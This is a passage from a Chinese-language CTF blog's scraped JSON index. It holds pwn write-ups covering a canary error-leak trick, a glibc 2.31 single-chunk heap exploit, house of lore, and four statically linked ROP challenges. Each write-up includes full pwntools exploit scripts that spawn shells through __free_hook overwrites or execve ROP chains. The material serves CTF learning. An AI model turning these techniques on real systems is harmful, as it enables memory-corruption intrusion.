i[j + 1]; BYTE1(v6) = i[j + 2]; HIWORD(v6) = i[j + 3]; break; &#125; if ( i[j] == &#x27;@&#x27; &amp;&amp; i[j + 2] == &#x27;*&#x27; &amp;&amp; i[j + 1] &gt; &#x27;`&#x27; &amp;&amp; i[j + 1] &lt;= 122 ) v1 = i[j + 1]; &#125; &#125; if ( fd &lt;= 2 || fd &gt; 10 ) &#123; puts(&quot;error!&quot;); exit(1); &#125; read(fd, ((SBYTE1(v6) &lt;&lt; 8) + (v6 &lt;&lt; 16) + SBYTE2(v6)), v1); return 0LL;&#125; 这一个函数的作用在于把flag文件的内容写到bss段上的地址 为什么要多此一举呢 在我TEB绕过canary的文章有提及stack_chk_fail函数输出报错信息的依据 原理这里就不复述了 顺便真的很想吐槽一句 这里非要加一个代码审计来强行使得题目难度看起来增加 不是很理解这种操作的意义何在 利用strtok函数返回一个指针 起始地址为我们输入的s字符串中 ‘&gt;’字符的地址 随后就是三个if判断 分别决定了文件描述符 read写入的地址 写入的字节长 唯一要注意的就是第二个if判断 由于调用的是scanf 所以如果我们想要读入地址的话 要注意不能为\\x20 或者 \\x00 这样的字节 会导致scanf截断 后面的字符丢失 __int64 sub_4013E1()&#123; char buf[8]; // [rsp+0h] [rbp-10h] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); if ( !dword_60204C ) &#123; puts(&quot;This is a strange overflow. Because of canary, you must not hijack the return address&quot;); read(0, buf, 0x200uLL); close(1); ++dword_60204C; &#125; return 0LL;&#125; 最后一个函数 提供了一次栈溢出的机会 此时计算一下stack_chk_fail调用的指针偏移 就可以借助报错输出flag了 完整exp: from pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;59.110.164.72&quot;,10001)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;./libc/libc.so.6&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;your choice : &quot;)io.sendline(b&#x27;2&#x27;)io.recvuntil(&quot;You can give any value, trust me, there will be no overflow&quot;)io.sendline(str(0x5fef))io.recvuntil(&quot;Actually, this function doesn&#x27;t seem to be useful&quot;)payload = b&quot;./flag\\x00\\x00&quot;*0xbfdio.sendline(payload)io.recvuntil(&quot;Really?&quot;)io.sendline(b&#x27;n&#x27;)io.recvuntil(&quot;your choice : &quot;)io.sendline(b&#x27;3&#x27;)io.recvuntil(&quot;Enter level:&quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;Enter mode:&quot;)io.sendline(b&#x27;2&#x27;)io.recvuntil(&quot;Enter X:&quot;)io.sendline(b&#x27;3&#x27;)io.recvuntil(&quot;Enter a string: &quot;)io.sendline(b&#x27;aaaa&#x27;)io.recvuntil(&quot;please input filename&quot;)# gdb.attach(io,&#x27;b *0x400EFB&#x27;)# pause(0)io.sendline(b&#x27;output.txt&#x27;)# pause()io.recvuntil(&quot;Do you want to write data?&quot;)io.sendline(b&#x27;2&#x27;)io.recvuntil(&quot;your choice : &quot;)io.sendline(b&#x27;4&#x27;)io.recvuntil(&quot;info&gt;&gt;&quot;)payload = b&#x27;&gt;:\\x60\\x21\\x21&#x27;+b&#x27;&gt;@a*&#x27;+b&#x27;&gt;~3&#x27;# gdb.attach(io,&#x27;b *0x4010AE&#x27;)# pause(0)io.sendline(payload)# pause()io.recvuntil(&quot;your choice : &quot;)io.sendline(b&#x27;5&#x27;)io.recvuntil(&quot;This is a strange overflow. Because of canary, you must not hijack the return address&quot;)payload = cyclic(0x18+0x100)+p64(0x602121)# gdb.attach(io,&#x27;b *0x401457&#x27;)# pause(0)io.send(payload)# pause()io.recv()io.recv() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"贵阳大数据及网络安全精英对抗赛","slug":"贵阳大数据及网络安全精英对抗赛","date":"2023-05-02T03:47:43.000Z","updated":"2023-09-14T17:18:10.000Z","comments":true,"path":"2023/05/02/贵阳大数据及网络安全精英对抗赛/","link":"","permalink":"http://example.com/2023/05/02/%E8%B4%B5%E9%98%B3%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B2%BE%E8%8B%B1%E5%AF%B9%E6%8A%97%E8%B5%9B/","excerpt":"","text":"就搞到一题附件 做了下发现对于只能操控单个chunk的利用手法不够熟练 于是用博客记录一下思路 libc版本是2.31 保护机制中规中矩 反正是个堆 都大差不差 void *add()&#123; void *v1; // [rsp-18h] [rbp-18h] printf(&quot;size: &quot;); __isoc99_scanf(&quot;%llu&quot;, &amp;nbytes); if ( v1 != ptr ) v1 = malloc(nbytes); printf(&quot;data: &quot;); read(0, v1, nbytes); puts(&quot;Create Complete!&quot;); return v1;&#125; add函数 只能操控一个chunk 不过这里的检查有漏洞 如果已经有一个chunk了 跳过的只是malloc的部分 输入data和size的并不受限 所以这里存在一个堆溢出漏洞 int delete()&#123; int result; // eax result = (int)ptr; if ( ptr ) &#123; free(ptr); result = puts(&quot;Delete Complete&quot;); &#125; return result;&#125; delete函数 明显存在一个UAF漏洞 int show()&#123; int result; // eax result = (int)ptr; if ( ptr ) result = printf(&quot;Your Note: %s\\n&quot;, (const char *)ptr); return result;&#125; show函数 调用printf打印堆块内容 int edit()&#123; void *v1; // [rsp-8h] [rbp-8h] if ( !ptr ) return puts(&quot;zero note!&quot;); v1 = ptr; printf(&quot;NewData: &quot;); read(0, v1, nbytes); return puts(&quot;Edit Complete!&quot;);&#125; edit函数 用来编辑堆块内容 那么总结下来 就是只能同时控制一个chunk 但是可以利用的漏洞都给了 这种情况下 我想到的是通过填满tcachebin的链表 从而申请到fastbin chunk 随后利用malloc_consolidate来把fastbin chunk放入到smallbin中 从而利用UAF泄露libc基址 还有一种办法是学习enllus1on师傅的 利用堆溢出覆盖top chunk的size 从而再次申请一个大chunk 于是就会重新分配一个top chunk 并且把原来的释放到unsortedbin中 这样也可以泄露libc基址 下面两种办法都演示一遍 add(0x30,b&#x27;aaaa&#x27;)delete()for i in range(7): edit(cyclic(0x10)) delete()add(0x80,b&#x27;aaaa&#x27;)bigchunk() 这里来实现double free的原理是因为tcache高版本新加入的key 位于bk域 只要覆盖key 就可以绕过double free检测 此时我们成功把fastbin中的chunk释放进入smallbin delete()add(0x30,b&#x27;1&#x27;)show()libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-1-0x1ebc30success(&quot;libc_addrr :&quot;+hex(libc_addr)) 随后就是重新申请这块空间 注意一下覆盖末位的值 需要减去 这样就成功获取到了libc基址 还有一种办法 先利用堆溢出覆盖top chunk的size 注意这个size要使得top chunk起始地址+size刚好到一个页的起始 add(0x10, &#x27;\\x00&#x27;)payload = b&#x27;\\x00&#x27;*0x18 + p64(0xd51)add(len(payload), payload)delete() 此时申请一个比top chunk大的chunk top chunk就会被释放进入unsortedbin add(0x1000, &#x27;aaaa&#x27;) 那么我们从unsortedbin中申请出来一个chunk 就可以泄露出libc基址 delete()add(0x20, &#x27;1&#x27;)show()libc_addr = u64(io.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x1ebbe0-0x551success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&quot;__free_hook&quot;]system_addr = libc_addr + libc.sym[&quot;system&quot;] 接下来就是如何实现任意写了 由于只能控制一个chunk 所以哪怕我们有double free 也没有办法申请出来任意地址的chunk 所以我们需要把size域更改 使得chunk被重新释放时进入其他链表 从而使得原来的链表保留任意写的地址 听不懂没有关系 接下来来详解一下 delete()edit(p64(0)*2)delete() 首先 利用老办法来构造一个double free的链表 此时 tcachebin中有两个链表 并且二者是物理相邻的 我们先申请出低地址处的0x20的链表 为了堆溢出覆盖到下一个chunk add(0x10,&#x27;aaaa&#x27;)payload = cyclic(0x18)+p64(0x51)+p64(free_hook-0x8)add(len(payload),payload) 可以看到此时size域被修改了 并且链表中写入了我们的目标地址 之所以要减去8 是因为只能控制一个chunk 如果我们想要采用覆盖free_hook的办法来获取shell 那么被释放的chunk首地址一定要为&#x2F;bin&#x2F;sh或者其他能够getshell的参数 delete()add(0x20,b&#x27;aaaa&#x27;) 此时把0x30的链表中申请出来 那么此时供我们控制的chunk指针也就是0x55e70eeee2b0这个 如果我们再次释放chunk呢 此时就会把这个chunk释放到0x50的链表中 和我们0x30链表中任意写的地址错位开 那么此时再次申请0x20大小的chunk 就可以达到任意写的目的了 完整exp: from pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;59.110.164.72&quot;,10001)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()def add(size,payload): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;1&#x27;) io.recvuntil(&quot;size: &quot;) io.sendline(str(size)) io.recvuntil(&quot;data: &quot;) io.send(payload)def delete(): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;2&#x27;)def show(): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;3&#x27;)def edit(payload): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;4&#x27;) io.recvuntil(&quot;NewData: &quot;) io.send(payload)def bigchunk(): io.recvuntil(&quot;choice: &quot;) io.sendline(b&#x27;1&#x27;*0x1000)# add(0x30,b&#x27;aaaa&#x27;)# delete()# for i in range(7):# edit(cyclic(0x10))# delete()# add(0x80,b&#x27;aaaa&#x27;)# bigchunk()# delete()# add(0x30,b&#x27;1&#x27;)# show()# libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-1-0x1ebc30# success(&quot;libc_addrr :&quot;+hex(libc_addr))# debug()add(0x10, &#x27;\\x00&#x27;)payload = b&#x27;\\x00&#x27;*0x18 + p64(0xd51)add(len(payload), payload)delete()add(0x1000, &#x27;aaaa&#x27;)delete()add(0x20, &#x27;1&#x27;)show()libc_addr = u64(io.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x1ebbe0-0x551success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&quot;__free_hook&quot;]system_addr = libc_addr + libc.sym[&quot;system&quot;]delete()edit(p64(0)*2)delete()add(0x10,&#x27;aaaa&#x27;)payload = cyclic(0x18)+p64(0x51)+p64(free_hook-0x8)add(len(payload),payload)delete()add(0x20,b&#x27;aaaa&#x27;)delete()add(0x20,b&#x27;/bin/sh\\x00&#x27;+p64(system_addr))delete()io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"house of lore","slug":"house-of-lore","date":"2023-04-27T03:35:47.000Z","updated":"2023-09-14T17:19:38.000Z","comments":true,"path":"2023/04/27/house-of-lore/","link":"","permalink":"http://example.com/2023/04/27/house-of-lore/","excerpt":"","text":"一种基于smallbin的任意写的攻击手法 不过要求非常高 需要先修改ptr_addr处 以此来绕过检查 所以我感觉是非常鸡肋的一种手法 不过还是记录一下 源码分析 if (in_smallbin_range (nb)) &#123; idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin) &#123; if (victim == 0) /* initialization check */ malloc_consolidate (av); else &#123; bck = victim-&gt;bk;if (__glibc_unlikely (bck-&gt;fd != victim)) &#123; errstr = &quot;malloc(): smallbin double linked list corrupted&quot;; goto errout; &#125; set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; &#125; &#125; &#125; 这段源码调用是在申请smallbin中的free chunk时 idx = smallbin_index (nb);bin = bin_at (av, idx); 这两句的作用在于获取smallbin的指针 idx的值为5 bin_at函数依据idx来搜寻对应的chunk last (bin)实际上是一个宏定义 #define last(b) ((b)-&gt;bk) 如果其与bin本身相等 则无法进入判断 wiki上的解释是说明此时链表为空 但是我测试如果利用malloc_consolidate来把fastbin放入smallbin 貌似也过不了判断 过了if后 还会进行一次判断 此时是判断small bin有没有进行初始化 如果初始化了就进入第二个分支 __glibc_unlikely (bck-&gt;fd != victim) 如果绕过这个判断就是实现本次攻击手法的关键 对于bck-&gt;fd指向的地址做了检测 而bck是通过这条赋值的 bck = victim-&gt;bk; 也就是说我们要构造成下面这样 之所以还要一个fake chunk2 是因为 如果只有fake chunk1 那么我们通过的是将attack_chunk从smallbin中申请出来的那次判断 此时plmalloc误判把fake chunk接到了 smallbin的倒数第二个 下次再次申请合适大小的chunk 就会申请到fake chunk 而要把fake chunk申请出来的话 就得再进行一次判断 也就用到了fake chunk2 不过这一点倒不是很需要担心 这需要对fake chunk的地址延申几个字长出来 用来充当fake chunk2就可以了 实际利用演示程序: 由我自己编写 包含UAF 堆溢出等漏洞 演示环境: ubuntu20 替换libc为libc2.23 fake_chunk1 = elf.bss(0x500)fake_chunk2 = elf.bss(0x700)add(0x100)#0add(0x10)#1add(0x10)#2delete(0)add(0x200)#3delete(1)delete(2)debug()show(2)io.recv()heap_addr = u64(io.recvuntil(&quot;\\x0a&quot;,drop = True).ljust(8,b&#x27;\\x00&#x27;))-0x110success(&quot;heap_addr :&quot;+hex(heap_addr)) 首先需要泄露堆地址 以便我们进行fake chunk的构造 随后进行fakechunk1和fakechunk2的构造 为了省事我程序自带了一个任意写的函数 具体题目的话 需要自己根据情况来构造 payload = p64(0)+p64(fake_chunk1)edit(0,len(payload),payload)chunk_addr = heap_addrpayload = p64(0)*2 + p64(chunk_addr)+p64(fake_chunk2)write_somewhere(fake_chunk1,payload)payload = p64(0)*2 + p64(fake_chunk1)write_somewhere(fake_chunk2,payload) 随后就是申请两个和smallbin chunk同样大小的chunk 第二个就会申请到fake chunk1的位置 add(0x100)#4add(0x100)#5 同时你可以注意到 fake chunk1和fake chunk2其实就隔一点字长就行 我上面还给空了0x100字节 其实就利用同一次任意写输入即可 总结我是对这个办法不太报希望 因为利用难度比较高 需要前提就具备一个已知地址任意写的漏洞 少数题目可能会提供 或者需要跟其他链配合利用 属于是单个存在没有什么用的链吧 我感觉 以后可能会打脸 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"2023网鼎杯","slug":"2023网鼎杯","date":"2023-04-20T03:50:31.000Z","updated":"2023-09-14T17:17:24.000Z","comments":true,"path":"2023/04/20/2023网鼎杯/","link":"","permalink":"http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/","excerpt":"","text":"题目的本身的难度非常简单 因为是RHG类型的题目 不过大部分都是静态编译的题目 并且删除了符号表 以前还没有接触过类似的题目 所以这次来学习一下怎么逻辑推理出各个函数 下面的顺序被我打乱了 因为附件也是学长发的 所以凑合着做吧 pwn1 32位 保护机制基本上全关了 解析来进入ida 由于删除了符号表 所以也不知道哪一个函数是main 先点进唯一有符号的start函数 // positive sp value has been detected, the output may be wrong!void __usercall __noreturn start(int a1@&lt;eax&gt;, int a2@&lt;edx&gt;)&#123; int v2; // esi int v3; // [esp-4h] [ebp-4h] BYREF void *retaddr; // [esp+0h] [ebp+0h] BYREF v2 = v3; v3 = a1; sub_8049200(sub_804890C, v2, &amp;retaddr, sub_80495D0, sub_8049670, a2, &amp;v3);&#125; 根据以往的经验分析 sub_8049200应该是libc_start_main函数 那么作为其rdi参数的sub_804890C应该是main函数了 void __noreturn sub_804890C()&#123; sub_804887C(); while ( 1 ) sub_80488CE();&#125; 跟进以后 可以看到不像是libc函数 为出题人编写的 所以猜测正确 为main函数 接下来分别跟进两个函数 int sub_804887C()&#123; sub_80511E0(off_80EB4BC, 0); sub_80511E0(off_80EB4B8, 0); sub_80511E0(off_80EB4B4, 0); return sub_806D410(300);&#125; 三个一样的函数 对.data段上三个相邻的参数进行操作 并且第二个参数还是0 这怎么看都是清空缓存区 用的setbuf函数嘛 至于最后的函数调用 我猜是alarm闹钟函数 毕竟有个300的参数 int sub_80488CE()&#123; char v1[104]; // [esp+0h] [ebp-68h] BYREF sub_804F4C0(&quot;please input what you want say&quot;); sub_806DDA0(0, v1, 256); return sub_804F9D0(v1);&#125; 这个函数应该就是漏洞点了 sub_804F4C0函数要么是printf要么是puts 直接运行程序并没有输出换行符 那么应该是printf sub_806DDA0看参数应该是read函数 最后的sub_804F9D0函数经过直接运行程序猜测是puts函数 那么至此程序的主要逻辑就明了了 while重复执行sub_80488CE函数 该函数存在栈溢出漏洞 再加上是静态编译 那么此时直接利用ROPgadget自带的构造rop链 getshell ROPgadget --binary pwn --ropchain 完整exp: from pwn import*from ctypes import *from struct import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;please input what you want say&quot;)p = b&#x27;a&#x27; * (0x68+4)p += pack(&#x27;&lt;I&#x27;, 0x0806f83b) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080eb060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080b8eb6) # pop eax ; retp += b&#x27;/bin&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805502b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806f83b) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080eb064) # @ .data + 4p += pack(&#x27;&lt;I&#x27;, 0x080b8eb6) # pop eax ; retp += b&#x27;//sh&#x27;p += pack(&#x27;&lt;I&#x27;, 0x0805502b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806f83b) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080eb068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080495a3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0805502b) # mov dword ptr [edx], eax ; retp += pack(&#x27;&lt;I&#x27;, 0x080481c9) # pop ebx ; retp += pack(&#x27;&lt;I&#x27;, 0x080eb060) # @ .datap += pack(&#x27;&lt;I&#x27;, 0x080df8bd) # pop ecx ; retp += pack(&#x27;&lt;I&#x27;, 0x080eb068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x0806f83b) # pop edx ; retp += pack(&#x27;&lt;I&#x27;, 0x080eb068) # @ .data + 8p += pack(&#x27;&lt;I&#x27;, 0x080495a3) # xor eax, eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0807b2f6) # inc eax ; retp += pack(&#x27;&lt;I&#x27;, 0x0806d443) # int 0x80success(&quot;len :&quot;+hex(len(p)))io.sendline(p)io.interactive() pwn2 还是跟上题一样 保护基本没开 静态编译32位 老规矩 还是跟着start函数索引到main函数 int sub_80488CE()&#123; int v0; // eax char v2; // [esp-Ch] [ebp-24h] int v3; // [esp+Ch] [ebp-Ch] sub_804887C(); v3 = sub_8059F50(48); sub_8048987(v3, 48); v0 = sub_804DBD0(v3 + 16) + 5; if ( v0 == 8 ) &#123; sub_8048987(v3, 48); &#125; else if ( v0 &gt; 8 ) &#123; if ( v0 == 10 ) return 0; if ( v0 == 85145 ) sub_804F700(&quot;/bin/sh&quot;); &#125; else if ( v0 == 6 ) &#123; sub_804FA00(&quot;where is shell&quot;, v2); &#125; return 1;&#125; 第一个涉及到的函数 int sub_804887C()&#123; sub_8051720(off_80EB4BC, 0); sub_8051720(off_80EB4B8, 0); sub_8051720(off_80EB4B4, 0); return sub_806D9C0(300);&#125; 很明显是setbuf清空缓存区 第二个函数 参数是一个数值 并且在函数最后找到了这样一行字符串 if ( v4 != _EBX ) sub_8056280(&quot;__libc_malloc&quot;); 所以大胆猜测是malloc 随后断点打在call 后 观察eax是否为堆地址返回值 成功验证猜想 至于第三个函数 看参数没有多少印象 所以觉得是出题人自己编写的函数 还得跟进一下看实现逻辑 int __cdecl sub_8048987(int a1, int a2)&#123; int i; // [esp+Ch] [ebp-Ch] for ( i = 0; a2 - 1 &gt; i; ++i ) &#123; if ( sub_806E380(0, i + a1, 1) != 1 ) sub_804E660(1); if ( *(_BYTE *)(i + a1) == 10 ) break; &#125; *(_BYTE *)(i + a1) = 0; return i;&#125; sub_806E380函数的参数构造有点像read sub_804E660的参数构造像exit函数 那么结合函数整体的逻辑 我认为是一个往刚刚申请的chunk中读入数据的函数 当读入的字符为\\n时 结束读入 并且把\\n字符所处的位置设置为\\x00 接下来第四个函数应该是最关键的了 从main函数的逻辑来看 这个函数的返回值将决定是否能够触发system(“&#x2F;bin&#x2F;sh”) int __cdecl sub_804DBD0(int a1)&#123; return sub_804E880(a1, 0, 10);&#125; 内部还调用了一个函数 不过这个函数的参数就有点眼熟了 a1是chunk的用户块+0x10处的地址 第二个参数为0 第三个参数是10 有点像strtol函数 为了印证猜想 看看函数结束后的eax寄存器是不是预期返回值 payload = cyclic(0x10)+b&#x27;85140&#x27; 之所以多了5 是因为在v0的值是strtol函数的返回值+5 那么就会进入对应的if判断式 直接调用system(“&#x2F;bin&#x2F;sh”) 至于最后的函数 实在是猜不出来 最后用sig文件解析了一下 再加上chatgpt 大概了解到其是一个可以直接把字符串输出到标准输出流的函数 int sub_804FA00(int a1, ...)&#123; va_list va; // [esp+14h] [ebp+8h] BYREF va_start(va, a1); return _IO_vfprintf_internal(off_80EB4B8, a1, (char *)va);&#125; exp： from pwn import*from ctypes import *from struct import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node.yuzhian.com.cn&quot;,32980)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)# context.arch = &quot;i386&quot;context.arch = &quot;amd64&quot;elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()payload = cyclic(0x10)+b&#x27;85140&#x27;# gdb.attach(io,&#x27;b *0x8048935&#x27;)# pause(0)io.sendline(payload)io.interactive() pwn3一开始还以为是个手写可见字符shellcode 但是转念一想 反正保护全关 也有很长的栈溢出 那就可以直接打呗 静态编译的程序一般都是打系统调用的 这里太久没做了 还卡住了 忘记32位的系统调用是int 0x80了 傻傻的用syscall打了半天 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; init(); while ( 1 ) vuln();&#125; int vuln()&#123; unsigned int v0; // eax char v2[96]; // [esp+8h] [ebp-70h] BYREF unsigned int j; // [esp+68h] [ebp-10h] int i; // [esp+6Ch] [ebp-Ch] printf(&quot;please input what you want say&quot;); read_len = read(0, v2, 288); for ( i = 0; i &lt; read_len; ++i ) &#123; for ( j = 0; ; ++j ) &#123; v0 = strlen(byte_80EB068); if ( v0 &lt;= j ) break; if ( v2[i] == *(j + 0x80EB068) ) exit(0); &#125; &#125; return puts(v2);&#125; 对于输入的字符进行了一个检查 如果为BINSHbinsh就exit 不过不影响 直接构造rop链 往bss段写binsh 随后execve系统调用就好了 from pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node5.anna.nssctf.cn&quot;,28881)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;please input what you want say&quot;)edi_addr = 0x08048480eax_addr = 0x080b8f16ebx_addr = 0x080481c9ecx_addr = 0x080df91d edx_addr = 0x0806f89bsyscall_addr = 0x0806331dsh_addr= 0x80EB070bss_addr = elf.bss(0x400)read_addr = 0x806DE00main_addr = 0x8048972int80_addr =0x0806d4a3payload = b&#x27;e&#x27;*0x74+p32(read_addr)+p32(main_addr)+p32(0)+p32(bss_addr)+p32(0x20)# gdb.attach(io,&#x27;b *0x8048971 &#x27;)# pause(0)io.send(payload)# pause()io.send(b&#x27;/bin/sh\\x00&#x27;)io.recvuntil(&quot;please input what you want say&quot;)payload = b&#x27;e&#x27;*0x74+p32(eax_addr)+p32(0xb)+p32(ebx_addr)+p32(bss_addr)+p32(ecx_addr)+p32(0)+p32(int80_addr)# gdb.attach(io,&#x27;b *0x8048971 &#x27;)# pause(0)io.send(payload)# pause()io.interactive() pwn4依然是什么保护都没有开 int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123; init(); while ( 1 ) vuln();&#125; int vuln()&#123; char v1[336]; // [esp+0h] [ebp-1B8h] BYREF char v2[104]; // [esp+150h] [ebp-68h] BYREF puts(&quot;please input your username&quot;); read(0, v2, 0x20); puts(&quot;please input your passwd&quot;); read(0, v1, 0x14F); return check(v1);&#125; 没有栈溢出 v1作为check函数的参数 跟进一下 int __cdecl check(int a1)&#123; int result; // eax char v2[16]; // [esp+Fh] [ebp-19h] BYREF unsigned __int8 v3; // [esp+1Fh] [ebp-9h] v3 = strlen(a1); if ( v3 &gt; 6u &amp;&amp; v3 &lt;= 8u ) &#123; printf(&quot;nice&quot;); result = strcpy(v2, a1); &#125; else &#123; printf(&quot;passwd error&quot;); result = 0; &#125; return result;&#125; 针对v1的长度进行了检测 只有7和8的时候可以调用strcpy进行栈溢出 这里一开始想的是直接\\x00绕过strlen 后来意识到strcpy也会被绕过 这个时候注意到v3这个参数的异常 你可以发现其位于ebp-0x9 这个位置有点不对劲 所以切换成汇编看一下 strlen的返回值存储在eax中 而用来比较的是al寄存器的值 所以这里可以绕过 原因就在于如果数值大一点 使得二进制形式的eax的1都位于高位 使得低八位的值比较小 就可以绕过了 完整exp: from pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;node5.anna.nssctf.cn&quot;,28881)elf = ELF(&quot;./pwn&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./ld-linux.so.2&quot;)libc = ELF(&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;def debug(): gdb.attach(io) pause()io.recvuntil(&quot;please input your username&quot;)io.send(b&#x27;chen&#x27;)io.recvuntil(&quot;please input your passwd&quot;)backdoor_addr = 0x80488CEpayload = cyclic(0x19+0x4)+p32(backdoor_addr)+cyclic(0xe6)# gdb.attach(io,&#x27;b *0x80488FB&#x27;)# pause(0)io.send(payload)# pause()io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"House of 